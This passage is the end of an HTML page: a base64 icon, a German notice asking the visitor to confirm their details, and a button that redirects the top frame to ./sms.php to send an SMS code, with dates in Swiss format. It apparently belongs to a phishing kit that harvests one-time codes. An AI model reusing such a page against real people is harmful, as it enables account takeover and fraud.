AgI2ghtpWBCf4207gcRdiFfY4QuNlhkjIQYZWwBXIfOIBfx44d3UfgpCb7zvTs2dNJCd/dYnMepHvM6zsKfNtywAkNsxshcN+D4GTD4HeBf0qy6lrLUHBACQZ2bdYb2DZML7MZvWlT8GG29nimVnCJbwtxAMHWv4NvvlsHfHzgiOWZW3VdVeKDUpipuCrm0/udO3f+1UJDrSuphqhgdaXQQGSwFWvTrVu3DVrTVuBplWMpG7VJZ3r09J0xgoWYpbMbgdcKOANaaDBAiYim0hD5P+PYK1ItsGFm7dq11RbXVI7jmnGiXrNDlixZsoFGt5a2Zu+bK/oCXWiYP7fg594GYWNhzqYOOMN00aJsRaI/cHpALBv1R6wzRsRpY6F5Wme0lkCX6vTcElTrTCSMPS9wvkgE1auBBLJOlSOceZoPGzlipd7AOWhwnkTly8OyzuQAHjyB9I/74EO0y+SkCvKM5ACCYazmzMzO4LPPPpOwlHNWxO17MISU4uPj3a7vzYpwZpOio6NnGjkeZsUtlmc2I7N79+4OH3/8scNlmuKZqSWzsg16l/8yfq15OF0iNagAVPbsBMh+gQEHQmhshhxv+TM4iV/LSWTtgW02Mnv3PblmFQWAbR9hSpPL9neg/O90/W5yJoRUrFjxBZixNECw8Oww6wjHkiEBjmBXsUfZBFgB+u0//U46hk3+cCRRagBV9GP2aRzQnE1m2BDSCGAFANo0ArVhOJG6IxLI2UD2n5New1oSiD3iQOnSpYu0a9duwUcffXQcxpJJSK2XaimPnJTS5MmT4zt16rQMglVFa4Nt27b9LSXSCRMmSLyONwLu3bsnTZs2zQjUhuKMiYlJxBLN/FoLrQ+AH5WPaNOmzVykEr+m5eFFlq6bLVu2/B58UG1nhiS5w2035NBoSTjPMewBXLhwoYScmobhNwoxW0RUrVp1hB89Y/7TFdiHlUQq8X03b950a/wRAkmC2cdOnLJzhFs1kHX8+PHJQQfGjh3rVrtqK02cOFFtUdOVa9y48SI1DPWnMqZXBEBgKsGMfxke4qIZNMYbVgYKfjQ0adKkMhjgpbimps9XY2Nj47g+7zWgWlVQ6f7NCZyKIFifVQHaPjjOBhbotqtFarpi8ObrgUO/wlmzZs2N5KrpsYxKwoHdXdhSXUC2rKP4zMbDuF4ti3Hq/hTyVc4dNGjQU2rrOCrH1sijR4+uBkXBKCzZhjgqp1zHxn8HytaAGpoGDBigXNb9G+GQqHv37rrj9RZCBEfMh7bS4nPPW21avp3KlStX6tq1669Lly697WyvwQeCSHX+oF+/ftvq1q3bXkXHg15//fX1znC6s1YZN27ccbSdzlX7MMZ8ZvDgwffhp+9OM6rqsALAqFhpqgjQoRDcLBLxoqzpip/+dP//cimAHbm05VEAAAAASUVORK5CYII="
                alt="Info" />
            <span>Bitte bestätigen Sie Ihre Angaben, um fortzufahren.</span>
        </div>
        <div class="button-group">
            <button class="button cancel-button">Abbrechen</button>
            <button class="button sms-button" onclick="top.location.href='./sms.php'">
                SMS-Code senden
            </button>
        </div>
    </div>
    <script>
    // Automatically set today's date
    const dateElement = document.getElementById("date");
    const today = new Date().toLocaleDateString("de-CH", {
        year: "numeric",
        month: "2-digit",
        day: "2-digit",
    });
    dateElement.textContent = today;
    </script>
</body>

</html>